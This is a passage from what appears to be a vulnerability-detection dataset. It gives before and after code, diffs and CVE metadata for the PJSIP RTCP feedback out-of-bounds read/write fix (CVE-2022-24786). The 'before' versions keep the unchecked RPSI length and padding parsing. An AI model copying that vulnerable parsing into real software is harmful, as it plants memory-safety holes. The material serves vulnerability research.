    for (i = 0; i < nack_cnt; ++i) {
	pj_uint16_t val;
	val = pj_htons((pj_uint16_t)nack[i].pid);
	pj_memcpy(p, &val, 2);
	val = pj_htons(nack[i].blp);
	pj_memcpy(p+2, &val, 2);
	p += 4;
    }

    /* Finally */
    *length = len;

    return PJ_SUCCESS;
}","VAR_0(pj_status_t) pjmedia_rtcp_fb_build_nack(
					pjmedia_rtcp_session *VAR_1,
					void *VAR_2,
					pj_size_t *VAR_3,
					unsigned VAR_4,
					const pjmedia_rtcp_fb_nack VAR_5[])
{
    pjmedia_rtcp_fb_common *VAR_6;
    pj_uint8_t *VAR_7;
    unsigned VAR_8, VAR_9;

    PJ_ASSERT_RETURN(VAR_1 && VAR_2 && VAR_3 && VAR_4 && VAR_5, VAR_10);

    VAR_8 = (3 + VAR_4) * 4;
    if (VAR_8 > *VAR_3)
	return VAR_11;

    /* COMMENT_0 */
    VAR_6 = (pjmedia_rtcp_fb_common*)VAR_2;
    pj_memcpy(VAR_6, &VAR_1->rtcp_fb_com, sizeof(*VAR_6));
    VAR_6->rtcp_common.pt = VAR_12;
    VAR_6->rtcp_common.count = 1; /* COMMENT_1 */
    VAR_6->rtcp_common.length = pj_htons((VAR_13)(VAR_8/4 - 1));

    /* COMMENT_2 */
    VAR_7 = (pj_uint8_t*)VAR_6 + sizeof(*VAR_6);
    for (VAR_9 = 0; VAR_9 < VAR_4; ++VAR_9) {
	pj_uint16_t VAR_14;
	VAR_14 = pj_htons((pj_uint16_t)VAR_5[VAR_9].pid);
	pj_memcpy(VAR_7, &VAR_14, 2);
	VAR_14 = pj_htons(VAR_5[VAR_9].blp);
	pj_memcpy(VAR_7+2, &VAR_14, 2);
	VAR_7 += 4;
    }

    /* COMMENT_3 */
    *VAR_3 = VAR_8;

    return VAR_15;
}",,"--- func_before
+++ func_after
@@ -5,7 +5,7 @@
 					unsigned nack_cnt,
 					const pjmedia_rtcp_fb_nack nack[])
 {
-    pjmedia_rtcp_common *hdr;
+    pjmedia_rtcp_fb_common *hdr;
     pj_uint8_t *p;
     unsigned len, i;
 
@@ -16,11 +16,11 @@
 	return PJ_ETOOSMALL;
 
     /* Build RTCP-FB NACK header */
-    hdr = (pjmedia_rtcp_common*)buf;
-    pj_memcpy(hdr, &session->rtcp_rr_pkt.common,  sizeof(*hdr));
-    hdr->pt = RTCP_RTPFB;
-    hdr->count = 1; /* FMT = 1 */
-    hdr->length = pj_htons((pj_uint16_t)(len/4 - 1));
+    hdr = (pjmedia_rtcp_fb_common*)buf;
+    pj_memcpy(hdr, &session->rtcp_fb_com, sizeof(*hdr));
+    hdr->rtcp_common.pt = RTCP_RTPFB;
+    hdr->rtcp_common.count = 1; /* FMT = 1 */
+    hdr->rtcp_common.length = pj_htons((pj_uint16_t)(len/4 - 1));
 
     /* Build RTCP-FB NACK FCI */
     p = (pj_uint8_t*)hdr + sizeof(*hdr);","{'deleted_lines': ['    pjmedia_rtcp_common *hdr;', '    hdr = (pjmedia_rtcp_common*)buf;', '    pj_memcpy(hdr, &session->rtcp_rr_pkt.common,  sizeof(*hdr));', '    hdr->pt = RTCP_RTPFB;', '    hdr->count = 1; /* FMT = 1 */', '    hdr->length = pj_htons((pj_uint16_t)(len/4 - 1));'], 'added_lines': ['    pjmedia_rtcp_fb_common *hdr;', '    hdr = (pjmedia_rtcp_fb_common*)buf;', '    pj_memcpy(hdr, &session->rtcp_fb_com, sizeof(*hdr));', '    hdr->rtcp_common.pt = RTCP_RTPFB;', '    hdr->rtcp_common.count = 1; /* FMT = 1 */', '    hdr->rtcp_common.length = pj_htons((pj_uint16_t)(len/4 - 1));']}",True,"PJSIP is a free and open source multimedia communication library written in C. PJSIP versions 2.12 and prior do not parse incoming RTCP feedback RPSI (Reference Picture Selection Indication) packet, but any app that directly uses pjmedia_rtcp_fb_parse_rpsi() will be affected. A patch is available in the `master` branch of the `pjsip/pjproject` GitHub repository. There are currently no known workarounds.",9.8,CRITICAL,3,valid,2022-04-06T03:40:09Z,4
CVE-2022-24786,"['CWE-787', 'CWE-125']",AV:N/AC:L/Au:N/C:P/I:P/A:P,0,pjsip/pjproject,"Merge pull request from GHSA-vhxv-phmx-g52q

* Prevent OOB read/write when parsing RTCP FB RPSI

* Add log information

* Modification based on comments.",11559e49e65bdf00922ad5ae28913ec6a198d508,https://github.com/pjsip/pjproject/commit/11559e49e65bdf00922ad5ae28913ec6a198d508,pjmedia/src/pjmedia/rtcp_fb.c,pjmedia_rtcp_fb_parse_pli,"PJ_DEF(pj_status_t) pjmedia_rtcp_fb_parse_pli(
const void *buf,
pj_size_t length)
{
pjmedia_rtcp_common *hdr = (pjmedia_rtcp_common*) buf;
PJ_ASSERT_RETURN(buf, PJ_EINVAL);
if (length < 12)
return PJ_ETOOSMALL;
if (hdr->pt != RTCP_PSFB || hdr->count != 1)
return PJ_ENOTFOUND;
return PJ_SUCCESS;
}","VAR_0(pj_status_t) pjmedia_rtcp_fb_parse_pli(
const void *VAR_1,
pj_size_t VAR_2)
{
pjmedia_rtcp_common *VAR_3 = (pjmedia_rtcp_common*) VAR_1;
PJ_ASSERT_RETURN(VAR_1, VAR_4);
if (VAR_2 < 12)
return VAR_5;
if (VAR_3->pt != VAR_6 || VAR_3->count != 1)
return VAR_7;
return VAR_8;
}",,"PJ_DEF(pj_status_t) pjmedia_rtcp_fb_parse_pli(
					const void *buf,
					pj_size_t length)
{
    pjmedia_rtcp_fb_common *hdr = (pjmedia_rtcp_fb_common*) buf;

    PJ_ASSERT_RETURN(buf, PJ_EINVAL);

    if (length < 12)
    	return PJ_ETOOSMALL;

    /* PLI uses pt==RTCP_PSFB and FMT==1 */
    if (hdr->rtcp_common.pt != RTCP_PSFB || hdr->rtcp_common.count != 1)
	return PJ_ENOTFOUND;

    return PJ_SUCCESS;
}","VAR_0(pj_status_t) pjmedia_rtcp_fb_parse_pli(
					const void *VAR_1,
					pj_size_t VAR_2)
{
    pjmedia_rtcp_fb_common *VAR_3 = (pjmedia_rtcp_fb_common*) VAR_1;

    PJ_ASSERT_RETURN(VAR_1, VAR_4);

    if (VAR_2 < 12)
    	return VAR_5;

    /* COMMENT_0 */
    if (VAR_3->rtcp_common.pt != VAR_6 || VAR_3->rtcp_common.count != 1)
	return VAR_7;

    return VAR_8;
}",,"--- func_before
+++ func_after
@@ -2,7 +2,7 @@
 					const void *buf,
 					pj_size_t length)
 {
-    pjmedia_rtcp_common *hdr = (pjmedia_rtcp_common*) buf;
+    pjmedia_rtcp_fb_common *hdr = (pjmedia_rtcp_fb_common*) buf;
 
     PJ_ASSERT_RETURN(buf, PJ_EINVAL);
 
@@ -10,7 +10,7 @@
     	return PJ_ETOOSMALL;
 
     /* PLI uses pt==RTCP_PSFB and FMT==1 */
-    if (hdr->pt != RTCP_PSFB || hdr->count != 1)
+    if (hdr->rtcp_common.pt != RTCP_PSFB || hdr->rtcp_common.count != 1)
 	return PJ_ENOTFOUND;
 
     return PJ_SUCCESS;","{'deleted_lines': ['    pjmedia_rtcp_common *hdr = (pjmedia_rtcp_common*) buf;', '    if (hdr->pt != RTCP_PSFB || hdr->count != 1)'], 'added_lines': ['    pjmedia_rtcp_fb_common *hdr = (pjmedia_rtcp_fb_common*) buf;', '    if (hdr->rtcp_common.pt != RTCP_PSFB || hdr->rtcp_common.count != 1)']}",True,"PJSIP is a free and open source multimedia communication library written in C. PJSIP versions 2.12 and prior do not parse incoming RTCP feedback RPSI (Reference Picture Selection Indication) packet, but any app that directly uses pjmedia_rtcp_fb_parse_rpsi() will be affected. A patch is available in the `master` branch of the `pjsip/pjproject` GitHub repository. There are currently no known workarounds.",9.8,CRITICAL,3,valid,2022-04-06T03:40:09Z,4
CVE-2022-24786,"['CWE-787', 'CWE-125']",AV:N/AC:L/Au:N/C:P/I:P/A:P,0,pjsip/pjproject,"Merge pull request from GHSA-vhxv-phmx-g52q

* Prevent OOB read/write when parsing RTCP FB RPSI

* Add log information

* Modification based on comments.",11559e49e65bdf00922ad5ae28913ec6a198d508,https://github.com/pjsip/pjproject/commit/11559e49e65bdf00922ad5ae28913ec6a198d508,pjmedia/src/pjmedia/rtcp_fb.c,pjmedia_rtcp_fb_parse_nack,"PJ_DEF(pj_status_t) pjmedia_rtcp_fb_parse_nack(
const void *buf,
pj_size_t length,
unsigned *nack_cnt,
pjmedia_rtcp_fb_nack nack[])
{
pjmedia_rtcp_common *hdr = (pjmedia_rtcp_common*) buf;
pj_uint8_t *p;
unsigned cnt, i;
PJ_ASSERT_RETURN(buf && nack_cnt && nack, PJ_EINVAL);
PJ_ASSERT_RETURN(length >= sizeof(pjmedia_rtcp_common), PJ_ETOOSMALL);
if (hdr->pt != RTCP_RTPFB || hdr->count != 1)
return PJ_ENOTFOUND;
cnt = pj_ntohs((pj_uint16_t)hdr->length);
if (cnt > 2) cnt -= 2; else cnt = 0;
if (length < (cnt+3)*4)
return PJ_ETOOSMALL;
*nack_cnt = PJ_MIN(*nack_cnt, cnt);
p = (pj_uint8_t*)hdr + sizeof(*hdr);
for (i = 0; i < *nack_cnt; ++i) {
pj_uint16_t val;
pj_memcpy(&val, p, 2);
nack[i].pid = pj_ntohs(val);
pj_memcpy(&val, p+2, 2);
nack[i].blp = pj_ntohs(val);
p += 4;
}
return PJ_SUCCESS;
}","VAR_0(pj_status_t) pjmedia_rtcp_fb_parse_nack(
const void *VAR_1,
pj_size_t VAR_2,
unsigned *VAR_3,
pjmedia_rtcp_fb_nack VAR_4[])
{
pjmedia_rtcp_common *VAR_5 = (pjmedia_rtcp_common*) VAR_1;
pj_uint8_t *VAR_6;
unsigned VAR_7, VAR_8;
PJ_ASSERT_RETURN(VAR_1 && VAR_3 && VAR_4, VAR_9);
PJ_ASSERT_RETURN(VAR_2 >= sizeof(pjmedia_rtcp_common), VAR_10);
if (VAR_5->pt != VAR_11 || VAR_5->count != 1)
return VAR_12;
VAR_7 = pj_ntohs((pj_uint16_t)VAR_5->length);
if (VAR_7 > 2) VAR_7 -= 2; else VAR_7 = 0;
if (VAR_2 < (VAR_7+3)*4)
return VAR_10;
*VAR_3 = PJ_MIN(*VAR_3, VAR_7);
VAR_6 = (pj_uint8_t*)VAR_5 + sizeof(*VAR_5);
for (VAR_8 = 0; VAR_8 < *VAR_3; ++VAR_8) {
pj_uint16_t VAR_13;
pj_memcpy(&VAR_13, VAR_6, 2);
VAR_4[VAR_8].pid = pj_ntohs(VAR_13);
pj_memcpy(&VAR_13, VAR_6+2, 2);
VAR_4[VAR_8].blp = pj_ntohs(VAR_13);
VAR_6 += 4;
}
return VAR_14;
}",,"PJ_DEF(pj_status_t) pjmedia_rtcp_fb_parse_nack(
					const void *buf,
					pj_size_t length,
					unsigned *nack_cnt,
					pjmedia_rtcp_fb_nack nack[])
{
    pjmedia_rtcp_fb_common *hdr = (pjmedia_rtcp_fb_common*) buf;
    pj_uint8_t *p;
    unsigned cnt, i;

    PJ_ASSERT_RETURN(buf && nack_cnt && nack, PJ_EINVAL);
    PJ_ASSERT_RETURN(length >= sizeof(pjmedia_rtcp_fb_common), PJ_ETOOSMALL);

    /* Generic NACK uses pt==RTCP_RTPFB and FMT==1 */
    if (hdr->rtcp_common.pt != RTCP_RTPFB || hdr->rtcp_common.count != 1)
	return PJ_ENOTFOUND;

    cnt = pj_ntohs((pj_uint16_t)hdr->rtcp_common.length);
    if (cnt > 2) cnt -= 2; else cnt = 0;
    if (length < (cnt+3)*4)
	return PJ_ETOOSMALL;

    *nack_cnt = PJ_MIN(*nack_cnt, cnt);

    p = (pj_uint8_t*)hdr + sizeof(*hdr);
    for (i = 0; i < *nack_cnt; ++i) {
	pj_uint16_t val;

	pj_memcpy(&val, p, 2);
	nack[i].pid = pj_ntohs(val);
	pj_memcpy(&val, p+2, 2);
	nack[i].blp = pj_ntohs(val);
	p += 4;
    }

    return PJ_SUCCESS;
}","VAR_0(pj_status_t) pjmedia_rtcp_fb_parse_nack(
					const void *VAR_1,
					pj_size_t VAR_2,
					unsigned *VAR_3,
					pjmedia_rtcp_fb_nack VAR_4[])
{
    pjmedia_rtcp_fb_common *VAR_5 = (pjmedia_rtcp_fb_common*) VAR_1;
    pj_uint8_t *VAR_6;
    unsigned VAR_7, VAR_8;

    PJ_ASSERT_RETURN(VAR_1 && VAR_3 && VAR_4, VAR_9);
    PJ_ASSERT_RETURN(VAR_2 >= sizeof(pjmedia_rtcp_fb_common), VAR_10);

    /* COMMENT_0 */
    if (VAR_5->rtcp_common.pt != VAR_11 || VAR_5->rtcp_common.count != 1)
	return VAR_12;

    VAR_7 = pj_ntohs((pj_uint16_t)VAR_5->rtcp_common.length);
    if (VAR_7 > 2) VAR_7 -= 2; else VAR_7 = 0;
    if (VAR_2 < (VAR_7+3)*4)
	return VAR_10;

    *VAR_3 = PJ_MIN(*VAR_3, VAR_7);

    VAR_6 = (pj_uint8_t*)VAR_5 + sizeof(*VAR_5);
    for (VAR_8 = 0; VAR_8 < *VAR_3; ++VAR_8) {
	pj_uint16_t VAR_13;

	pj_memcpy(&VAR_13, VAR_6, 2);
	VAR_4[VAR_8].pid = pj_ntohs(VAR_13);
	pj_memcpy(&VAR_13, VAR_6+2, 2);
	VAR_4[VAR_8].blp = pj_ntohs(VAR_13);
	VAR_6 += 4;
    }

    return VAR_14;
}",,"--- func_before
+++ func_after
@@ -4,18 +4,18 @@
 					unsigned *nack_cnt,
 					pjmedia_rtcp_fb_nack nack[])
 {
-    pjmedia_rtcp_common *hdr = (pjmedia_rtcp_common*) buf;
+    pjmedia_rtcp_fb_common *hdr = (pjmedia_rtcp_fb_common*) buf;
     pj_uint8_t *p;
     unsigned cnt, i;
 
     PJ_ASSERT_RETURN(buf && nack_cnt && nack, PJ_EINVAL);
-    PJ_ASSERT_RETURN(length >= sizeof(pjmedia_rtcp_common), PJ_ETOOSMALL);
+    PJ_ASSERT_RETURN(length >= sizeof(pjmedia_rtcp_fb_common), PJ_ETOOSMALL);
 
     /* Generic NACK uses pt==RTCP_RTPFB and FMT==1 */
-    if (hdr->pt != RTCP_RTPFB || hdr->count != 1)
+    if (hdr->rtcp_common.pt != RTCP_RTPFB || hdr->rtcp_common.count != 1)
 	return PJ_ENOTFOUND;
 
-    cnt = pj_ntohs((pj_uint16_t)hdr->length);
+    cnt = pj_ntohs((pj_uint16_t)hdr->rtcp_common.length);
     if (cnt > 2) cnt -= 2; else cnt = 0;
     if (length < (cnt+3)*4)
 	return PJ_ETOOSMALL;","{'deleted_lines': ['    pjmedia_rtcp_common *hdr = (pjmedia_rtcp_common*) buf;', '    PJ_ASSERT_RETURN(length >= sizeof(pjmedia_rtcp_common), PJ_ETOOSMALL);', '    if (hdr->pt != RTCP_RTPFB || hdr->count != 1)', '    cnt = pj_ntohs((pj_uint16_t)hdr->length);'], 'added_lines': ['    pjmedia_rtcp_fb_common *hdr = (pjmedia_rtcp_fb_common*) buf;', '    PJ_ASSERT_RETURN(length >= sizeof(pjmedia_rtcp_fb_common), PJ_ETOOSMALL);', '    if (hdr->rtcp_common.pt != RTCP_RTPFB || hdr->rtcp_common.count != 1)', '    cnt = pj_ntohs((pj_uint16_t)hdr->rtcp_common.length);']}",True,"PJSIP is a free and open source multimedia communication library written in C. PJSIP versions 2.12 and prior do not parse incoming RTCP feedback RPSI (Reference Picture Selection Indication) packet, but any app that directly uses pjmedia_rtcp_fb_parse_rpsi() will be affected. A patch is available in the `master` branch of the `pjsip/pjproject` GitHub repository. There are currently no known workarounds.",9.8,CRITICAL,3,valid,2022-04-06T03:40:09Z,4
CVE-2022-24786,"['CWE-787', 'CWE-125']",AV:N/AC:L/Au:N/C:P/I:P/A:P,0,pjsip/pjproject,"Merge pull request from GHSA-vhxv-phmx-g52q

* Prevent OOB read/write when parsing RTCP FB RPSI

* Add log information

* Modification based on comments.",11559e49e65bdf00922ad5ae28913ec6a198d508,https://github.com/pjsip/pjproject/commit/11559e49e65bdf00922ad5ae28913ec6a198d508,pjmedia/src/pjmedia/rtcp_fb.c,pjmedia_rtcp_fb_parse_rpsi,"PJ_DEF(pj_status_t) pjmedia_rtcp_fb_parse_rpsi(
const void *buf,
pj_size_t length,
pjmedia_rtcp_fb_rpsi *rpsi)
{
pjmedia_rtcp_common *hdr = (pjmedia_rtcp_common*) buf;
pj_uint8_t *p;
pj_uint8_t padlen;
pj_size_t rpsi_len;
PJ_ASSERT_RETURN(buf && rpsi, PJ_EINVAL);
PJ_ASSERT_RETURN(length >= sizeof(pjmedia_rtcp_common), PJ_ETOOSMALL);
if (hdr->pt != RTCP_PSFB || hdr->count != 3)
return PJ_ENOTFOUND;
rpsi_len = (pj_ntohs((pj_uint16_t)hdr->length)-2) * 4;
if (length < rpsi_len + 12)
return PJ_ETOOSMALL;
p = (pj_uint8_t*)hdr + sizeof(*hdr);
padlen = *p++;
rpsi->pt = (*p++ & 0x7F);
rpsi->rpsi_bit_len = rpsi_len*8 - 16 - padlen;
pj_strset(&rpsi->rpsi, (char*)p, (rpsi->rpsi_bit_len + 7)/8);
return PJ_SUCCESS;
}","VAR_0(pj_status_t) pjmedia_rtcp_fb_parse_rpsi(
const void *VAR_1,
pj_size_t VAR_2,
pjmedia_rtcp_fb_rpsi *VAR_3)
{
pjmedia_rtcp_common *VAR_4 = (pjmedia_rtcp_common*) VAR_1;
pj_uint8_t *VAR_5;
pj_uint8_t VAR_6;
pj_size_t VAR_7;
PJ_ASSERT_RETURN(VAR_1 && VAR_3, VAR_8);
PJ_ASSERT_RETURN(VAR_2 >= sizeof(pjmedia_rtcp_common), VAR_9);
if (VAR_4->pt != VAR_10 || VAR_4->count != 3)
return VAR_11;
VAR_7 = (pj_ntohs((pj_uint16_t)VAR_4->length)-2) * 4;
if (VAR_2 < VAR_7 + 12)
return VAR_9;
VAR_5 = (pj_uint8_t*)VAR_4 + sizeof(*VAR_4);
VAR_6 = *VAR_5++;
VAR_3->pt = (*VAR_5++ & 0x7F);
VAR_3->rpsi_bit_len = VAR_7*8 - 16 - VAR_6;
pj_strset(&VAR_3->rpsi, (char*)VAR_5, (VAR_3->rpsi_bit_len + 7)/8);
return VAR_12;
}",,"PJ_DEF(pj_status_t) pjmedia_rtcp_fb_parse_rpsi(
					const void *buf,
					pj_size_t length,
					pjmedia_rtcp_fb_rpsi *rpsi)
{
    pjmedia_rtcp_fb_common *hdr = (pjmedia_rtcp_fb_common*) buf;
    pj_uint8_t *p;
    pj_uint8_t padlen;
    pj_size_t rpsi_len;

    PJ_ASSERT_RETURN(buf && rpsi, PJ_EINVAL);
    PJ_ASSERT_RETURN(length >= sizeof(pjmedia_rtcp_fb_common), PJ_ETOOSMALL);

    /* RPSI uses pt==RTCP_PSFB and FMT==3 */
    if (hdr->rtcp_common.pt != RTCP_PSFB || hdr->rtcp_common.count != 3)
	return PJ_ENOTFOUND;

    if (hdr->rtcp_common.length < 3) {    
        PJ_PERROR(3, (THIS_FILE, PJ_ETOOSMALL,
                      ""Failed parsing FB RPSI, invalid header length""));
	return PJ_ETOOSMALL;
    }

    rpsi_len = (pj_ntohs((pj_uint16_t)hdr->rtcp_common.length)-2) * 4;
    if (length < rpsi_len + 12)
	return PJ_ETOOSMALL;

    p = (pj_uint8_t*)hdr + sizeof(*hdr);
    padlen = *p++;

    if (padlen >= 32) {
        PJ_PERROR(3, (THIS_FILE, PJ_ETOOBIG,
                      ""Failed parsing FB RPSI, invalid RPSI padding len""));
	return PJ_ETOOBIG;
    }

    if ((rpsi_len * 8) < (unsigned)(16 + padlen)) {
        PJ_PERROR(3, (THIS_FILE, PJ_ETOOSMALL,
                      ""Failed parsing FB RPSI, invalid RPSI bit len""));
	return PJ_ETOOSMALL;
    }

    rpsi->pt = (*p++ & 0x7F);
    rpsi->rpsi_bit_len = rpsi_len*8 - 16 - padlen;
    pj_strset(&rpsi->rpsi, (char*)p, (rpsi->rpsi_bit_len + 7)/8);

    return PJ_SUCCESS;
}","VAR_0(pj_status_t) pjmedia_rtcp_fb_parse_rpsi(
					const void *VAR_1,
					pj_size_t VAR_2,
					pjmedia_rtcp_fb_rpsi *VAR_3)
{
    pjmedia_rtcp_fb_common *VAR_4 = (pjmedia_rtcp_fb_common*) VAR_1;
    pj_uint8_t *VAR_5;
    pj_uint8_t VAR_6;
    pj_size_t VAR_7;

    PJ_ASSERT_RETURN(VAR_1 && VAR_3, VAR_8);
    PJ_ASSERT_RETURN(VAR_2 >= sizeof(pjmedia_rtcp_fb_common), VAR_9);

    /* COMMENT_0 */
    if (VAR_4->rtcp_common.pt != VAR_10 || VAR_4->rtcp_common.count != 3)
	return VAR_11;

    if (VAR_4->rtcp_common.length < 3) {    
        PJ_PERROR(3, (VAR_12, VAR_9,
                      ""Failed parsing FB RPSI, invalid header length""));
	return VAR_9;
    }

    VAR_7 = (pj_ntohs((pj_uint16_t)VAR_4->rtcp_common.length)-2) * 4;
    if (VAR_2 < VAR_7 + 12)
	return VAR_9;

    VAR_5 = (pj_uint8_t*)VAR_4 + sizeof(*VAR_4);
    VAR_6 = *VAR_5++;

    if (VAR_6 >= 32) {
        PJ_PERROR(3, (VAR_12, VAR_13,
                      ""Failed parsing FB RPSI, invalid RPSI padding len""));
	return VAR_13;
    }

    if ((VAR_7 * 8) < (unsigned)(16 + VAR_6)) {
        PJ_PERROR(3, (VAR_12, VAR_9,
                      ""Failed parsing FB RPSI, invalid RPSI bit len""));
	return VAR_9;
    }

    VAR_3->pt = (*VAR_5++ & 0x7F);
    VAR_3->rpsi_bit_len = VAR_7*8 - 16 - VAR_6;
    pj_strset(&VAR_3->rpsi, (char*)VAR_5, (VAR_3->rpsi_bit_len + 7)/8);

    return VAR_14;
}",,"--- func_before
+++ func_after
@@ -3,24 +3,43 @@
 					pj_size_t length,
 					pjmedia_rtcp_fb_rpsi *rpsi)
 {
-    pjmedia_rtcp_common *hdr = (pjmedia_rtcp_common*) buf;
+    pjmedia_rtcp_fb_common *hdr = (pjmedia_rtcp_fb_common*) buf;
     pj_uint8_t *p;
     pj_uint8_t padlen;
     pj_size_t rpsi_len;
 
     PJ_ASSERT_RETURN(buf && rpsi, PJ_EINVAL);
-    PJ_ASSERT_RETURN(length >= sizeof(pjmedia_rtcp_common), PJ_ETOOSMALL);
+    PJ_ASSERT_RETURN(length >= sizeof(pjmedia_rtcp_fb_common), PJ_ETOOSMALL);
 
     /* RPSI uses pt==RTCP_PSFB and FMT==3 */
-    if (hdr->pt != RTCP_PSFB || hdr->count != 3)
+    if (hdr->rtcp_common.pt != RTCP_PSFB || hdr->rtcp_common.count != 3)
 	return PJ_ENOTFOUND;
 
-    rpsi_len = (pj_ntohs((pj_uint16_t)hdr->length)-2) * 4;
+    if (hdr->rtcp_common.length < 3) {    
+        PJ_PERROR(3, (THIS_FILE, PJ_ETOOSMALL,
+                      ""Failed parsing FB RPSI, invalid header length""));
+	return PJ_ETOOSMALL;
+    }
+
+    rpsi_len = (pj_ntohs((pj_uint16_t)hdr->rtcp_common.length)-2) * 4;
     if (length < rpsi_len + 12)
 	return PJ_ETOOSMALL;
 
     p = (pj_uint8_t*)hdr + sizeof(*hdr);
     padlen = *p++;
+
+    if (padlen >= 32) {
+        PJ_PERROR(3, (THIS_FILE, PJ_ETOOBIG,
+                      ""Failed parsing FB RPSI, invalid RPSI padding len""));
+	return PJ_ETOOBIG;
+    }
+
+    if ((rpsi_len * 8) < (unsigned)(16 + padlen)) {
+        PJ_PERROR(3, (THIS_FILE, PJ_ETOOSMALL,
+                      ""Failed parsing FB RPSI, invalid RPSI bit len""));
+	return PJ_ETOOSMALL;
+    }
+
     rpsi->pt = (*p++ & 0x7F);
     rpsi->rpsi_bit_len = rpsi_len*8 - 16 - padlen;
     pj_strset(&rpsi->rpsi, (char*)p, (rpsi->rpsi_bit_len + 7)/8);","{'deleted_lines': ['    pjmedia_rtcp_common *hdr = (pjmedia_rtcp_common*) buf;', '    PJ_ASSERT_RETURN(length >= sizeof(pjmedia_rtcp_common), PJ_ETOOSMALL);', '    if (hdr->pt != RTCP_PSFB || hdr->count != 3)', '    rpsi_len = (pj_ntohs((pj_uint16_t)hdr->length)-2) * 4;'], 'added_lines': ['    pjmedia_rtcp_fb_common *hdr = (pjmedia_rtcp_fb_common*) buf;', '    PJ_ASSERT_RETURN(length >= sizeof(pjmedia_rtcp_fb_common), PJ_ETOOSMALL);', '    if (hdr->rtcp_common.pt != RTCP_PSFB || hdr->rtcp_common.count != 3)', '    if (hdr->rtcp_common.length < 3) {    ', '        PJ_PERROR(3, (THIS_FILE, PJ_ETOOSMALL,', '                      ""Failed parsing FB RPSI, invalid header length""));', '\treturn PJ_ETOOSMALL;', '    }', '', '    rpsi_len = (pj_ntohs((pj_uint16_t)hdr->rtcp_common.length)-2) * 4;', '', '    if (padlen >= 32) {', '        PJ_PERROR(3, (THIS_FILE, PJ_ETOOBIG,', '                      ""Failed parsing FB RPSI, invalid RPSI padding len""));', '\treturn PJ_ETOOBIG;', '    }', '', '    if ((rpsi_len * 8) < (unsigned)(16 + padlen)) {', '        PJ_PERROR(3, (THIS_FILE, PJ_ETOOSMALL,', '                      ""Failed parsing FB RPSI, invalid RPSI bit len""));', '\treturn PJ_ETOOSMALL;', '    }', '']}",True,"PJSIP is a free and open source multimedia communication library written in C. PJSIP versions 2.12 and prior do not parse incoming RTCP feedback RPSI (Reference Picture Selection Indication) packet, but any app that directly uses pjmedia_rtcp_fb_parse_rpsi() will be affected. A patch is available in the `master` branch of the `pjsip/pjproject` GitHub repository. There are currently no known workarounds.",9.8,CRITICAL,3,valid,2022-04-06T03:40:09Z,4
CVE-2022-24786,"['CWE-787', 'CWE-125']",AV:N/AC:L/Au:N/C:P/I:P/A:P,0,pjsip/pjproject,"Merge pull request from GHSA-vhxv-phmx-g52q

* Prevent OOB read/write when parsing RTCP FB RPSI

* Add log information

* Modification based on comments.",11559e49e65bdf00922ad5ae28913ec6a198d508,https://github.com/pjsip/pjproject/commit/11559e49e65bdf00922ad5ae28913ec6a198d508,pjmedia/src/pjmedia/rtcp.c,pjmedia_rtcp_init2,"PJ_DEF(void) pjmedia_rtcp_init2( pjmedia_rtcp_session *sess,
const pjmedia_rtcp_session_setting *settings)
{
pjmedia_rtcp_sr_pkt *sr_pkt = &sess->rtcp_sr_pkt;
pj_time_val now;
pj_bzero(sess, sizeof(pjmedia_rtcp_session));
sess->rtp_last_ts = (unsigned)-1;
sess->name = settings->name ? settings->name : (char*)THIS_FILE;
sess->clock_rate = settings->clock_rate;
sess->pkt_size = settings->samples_per_frame;
sr_pkt->common.version = 2;
sr_pkt->common.count = 1;
sr_pkt->common.pt = RTCP_SR;
sr_pkt->common.length = pj_htons(12);
sr_pkt->common.ssrc = pj_htonl(settings->ssrc);
pj_memcpy(&sess->rtcp_rr_pkt.common, &sr_pkt->common, 
sizeof(pjmedia_rtcp_common));
sess->rtcp_rr_pkt.common.pt = RTCP_RR;
sess->rtcp_rr_pkt.common.length = pj_htons(7);
pj_gettimeofday(&now);
sess->tv_base = now;
pj_get_timestamp(&sess->ts_base);
pj_get_timestamp_freq(&sess->ts_freq);
sess->rtp_ts_base = settings->rtp_ts_base;
pjmedia_rtcp_init_stat(&sess->stat);
}","VAR_0(void) pjmedia_rtcp_init2( pjmedia_rtcp_session *VAR_1,
const pjmedia_rtcp_session_setting *VAR_2)
{
pjmedia_rtcp_sr_pkt *VAR_3 = &VAR_1->rtcp_sr_pkt;
pj_time_val VAR_4;
pj_bzero(VAR_1, sizeof(pjmedia_rtcp_session));
VAR_1->rtp_last_ts = (unsigned)-1;
VAR_1->name = VAR_2->name ? VAR_2->name : (char*)VAR_5;
VAR_1->clock_rate = VAR_2->clock_rate;
VAR_1->pkt_size = VAR_2->samples_per_frame;
VAR_3->common.version = 2;
VAR_3->common.count = 1;
VAR_3->common.pt = VAR_6;
VAR_3->common.length = pj_htons(12);
VAR_3->common.ssrc = pj_htonl(VAR_2->ssrc);
pj_memcpy(&VAR_1->rtcp_rr_pkt.common, &VAR_3->common, 
sizeof(VAR_7));
VAR_1->rtcp_rr_pkt.common.pt = VAR_8;
VAR_1->rtcp_rr_pkt.common.length = pj_htons(7);
pj_gettimeofday(&VAR_4);
VAR_1->tv_base = VAR_4;
pj_get_timestamp(&VAR_1->ts_base);
pj_get_timestamp_freq(&VAR_1->ts_freq);
VAR_1->rtp_ts_base = VAR_2->rtp_ts_base;
pjmedia_rtcp_init_stat(&VAR_1->stat);
}",,"PJ_DEF(void) pjmedia_rtcp_init2( pjmedia_rtcp_session *sess,
				 const pjmedia_rtcp_session_setting *settings)
{
    pjmedia_rtcp_sr_pkt *sr_pkt = &sess->rtcp_sr_pkt;
    pj_time_val now;
    
    /* Memset everything */
    pj_bzero(sess, sizeof(pjmedia_rtcp_session));

    /* Last RX timestamp in RTP packet */
    sess->rtp_last_ts = (unsigned)-1;

    /* Name */
    sess->name = settings->name ? settings->name : (char*)THIS_FILE;

    /* Set clock rate */
    sess->clock_rate = settings->clock_rate;
    sess->pkt_size = settings->samples_per_frame;

    /* Init common RTCP SR header */
    sr_pkt->common.version = 2;
    sr_pkt->common.count = 1;
    sr_pkt->common.pt = RTCP_SR;
    sr_pkt->common.length = pj_htons(12);
    sr_pkt->common.ssrc = pj_htonl(settings->ssrc);
    
    /* Copy to RTCP RR header */
    pj_memcpy(&sess->rtcp_rr_pkt.common, &sr_pkt->common, 
	      sizeof(pjmedia_rtcp_common));
    sess->rtcp_rr_pkt.common.pt = RTCP_RR;
    sess->rtcp_rr_pkt.common.length = pj_htons(7);

    /* Copy to RTCP FB common header */
    pj_memcpy(&sess->rtcp_fb_com, &sr_pkt->common, 
	      sizeof(pjmedia_rtcp_common));
    sess->rtcp_fb_com.ssrc_src = 0;

    /* Get time and timestamp base and frequency */
    pj_gettimeofday(&now);
